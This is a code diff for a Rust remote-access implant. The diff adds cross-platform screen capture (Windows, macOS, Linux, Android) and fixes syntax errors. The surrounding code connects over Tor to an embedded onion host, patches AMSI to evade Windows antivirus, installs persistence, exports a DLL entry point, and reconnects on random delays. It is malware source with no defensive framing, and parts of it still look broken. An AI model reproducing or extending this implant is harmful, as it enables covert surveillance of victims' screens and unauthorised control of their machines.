@@ -9,6 +9,7 @@ mod persist;
 #[cfg(target_os = "windows")]
 use is_elevated::is_elevated;
 
+
 use arti_client::{TorClient, TorClientConfig, DataStream};
 use tor_rtcompat::PreferredRuntime;
 use tokio::io::split;
@@ -17,12 +18,28 @@ use tokio::process::Command;
 use anyhow::{Result, anyhow};
 use gethostname::gethostname;
 use tokio::time::{sleep, Duration};
-use rand::Rng;
-use std::{fs,env};
-use std::path::{Path, Prefix};
+use rand::{thread_rng};
+use std::{fs};
+use std::path::{Path};
 use base64::{engine::general_purpose, Engine as _};
-[cfg(target_os != "android")]
+use libc::{c_int};
+
+#[cfg(target_os = "windows")]
 use screenshots::Screen;
+#[cfg(target_os = "macos")]
+use screenshots::Screen;
+#[cfg(target_os = "linux")]
+use screenshots::Screen;
+
+#[cfg(target_os = "windows")]
+use image::ImageOutputFormat;
+#[cfg(target_os = "macos")]
+use image::ImageOutputFormat;
+#[cfg(target_os = "linux")]
+use image::ImageOutputFormat;
+
+
+
 
 
 #[cfg(target_os = "windows")]
@@ -36,6 +53,7 @@ const CONFIG_HOSTNAME: &[u8] = include_bytes!("../config/hostname");
 fn get_onion_host() -> String {
     String::from_utf8_lossy(CONFIG_HOSTNAME).trim().to_string()
 }
+
 
 #[derive(Clone, Debug)]
 pub struct ClientConfig {
@@ -59,30 +77,51 @@ async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
     println!("Initialized Tor Client");
     Ok(client)
 }
-#[cfg(target_os != "android")]
+#[cfg(target_os = "linux")]
 fn take_screenshot_base64() -> anyhow::Result<String> {
     let screens = Screen::all()?;
     let screen = &screens[0];
 
-    let image = screen.capture()?;
-
+    let image_buffer = screen.capture()?;
     let mut buf = Vec::new();
-    image.write_to(&mut buf, image::ImageOutputFormat::Png)?;
-    let encoded = general_purpose::STANDARD.encode(&buf) 
+    image_buffer.write_to(&buf, ImageOutputFormat::Png)?;
+    let encoded = general_purpose::STANDARD.encode(&buf); 
     Ok(format!("{}",encoded))
 }
-#[cfg(target_os == "android")]
+#[cfg(target_os = "windows")]
+fn take_screenshot_base64() -> anyhow::Result<String> {
+    let screens = Screen::all()?;
+    let screen = &screens[0];
+
+    let image_buffer = screen.capture()?;
+    let mut buf = Vec::new();
+    image_buffer.write_to(&buf, ImageOutputFormat::Png)?;
+    let encoded = general_purpose::STANDARD.encode(&buf); 
+    Ok(format!("{}",encoded))
+}
+#[cfg(target_os = "macos")]
+fn take_screenshot_base64() -> anyhow::Result<String> {
+    let screens = Screen::all()?;
+    let screen = &screens[0];
+
+    let image_buffer = screen.capture()?;
+    let mut buf = Vec::new();
+    image_buffer.write_to(&buf, ImageOutputFormat::Png)?;
+    let encoded = general_purpose::STANDARD.encode(&buf); 
+    Ok(format!("{}",encoded))
+}
+#[cfg(target_os = "android")]
 fn take_screenshot_base64()-> anyhow::Result<String>{
-    let path_str = "/data/local/tmp/screenshot.png"
-    Command::new("screencap")
+    let path_str = "/data/local/tmp/screenshot.png";
+    let output = Command::new("screencap")
     .arg("-p")
     .arg(path_str)
-    .output()?;
-    let path = Path::new(path);
-    let bytes = fs::read(path);
+    .output();
+    let path = Path::new(path_str);
+    let buf = fs::read(path)?;
     fs::remove_file(path);
-    let encoded = general_purpose::STANDARD.encode(&buf) ;
-    Ok(format!("{}",encode))
+    let encoded = general_purpose::STANDARD.encode(buf);
+    Ok(format!("{}",encoded))
 }
 
 
@@ -322,17 +361,15 @@ pub async fn netclient_run(config: ClientConfig) -> Result<()> {
                 println!("Connection failed: {}", e);
             }
         }
-
-        let delay: u64 = rand::thread_rng().gen_range(19..=67);
-
+        let mut rng = thread_rng();
+        let delay = rng.gen_range(19..=67);
         println!("Reconnecting in {} seconds...", delay);
         sleep(Duration::from_secs(delay)).await;
     }
 }
-
-#[unsafe(no_mangle)]
+const IS_DLL:bool = true;
 #[unsafe(export_name = "netclient")]
-pub async extern "C" fn netclient()-> Result<()>{
+pub async extern "C" fn netclient()->  c_int {
     #[cfg(target_os = "windows")]
     amsi_patch::amsi_patch();
 
@@ -351,11 +388,11 @@ pub async extern "C" fn netclient()-> Result<()>{
         return Ok(());
     } 
     #[cfg(target_os = "windows")]
-    persist::persist()?;
+    persist::persist(IS_DLL)?;
     #[cfg(target_os = "windows")]
     if !is_elevated(){
         sleep(Duration::from_secs(61)).await;
     }
-    netclient_run(ClientConfig::default()).await?;
-    return Ok(());
+    netclient_run(ClientConfig::default()).await;
+    return 0;
 }
